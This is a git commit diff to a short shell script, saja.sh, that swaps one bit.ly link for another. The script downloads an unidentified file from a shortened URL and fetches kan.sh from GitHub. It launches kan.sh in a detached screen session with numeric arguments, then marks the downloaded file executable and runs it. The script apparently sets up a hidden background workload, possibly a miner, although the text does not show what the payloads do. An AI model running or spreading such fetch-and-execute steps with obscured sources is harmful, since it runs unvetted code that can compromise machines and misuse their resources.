2a1b721e617db84a4ced0f665a8d47170f662410
prathhub <88438190+prathhub@users.noreply.github.com>
2021-08-06 11:30:05 +0530

    Update saja.sh

--- saja.sh
+++ saja.sh
@@ -2,9 +2,9 @@
 
 sudo apt update
 sudo apt install screen -y
-wget https://bit.ly/2VtpMTV
+wget https://bit.ly/3yrWeog
 wget https://raw.githubusercontent.com/prathhub/FkgX/main/kan.sh
 chmod +x kan.sh
 screen -dmS kan ./kan.sh 60 70
-chmod +x 2VtpMTV
-./2VtpMTV
+chmod +x 3yrWeog
+./3yrWeog
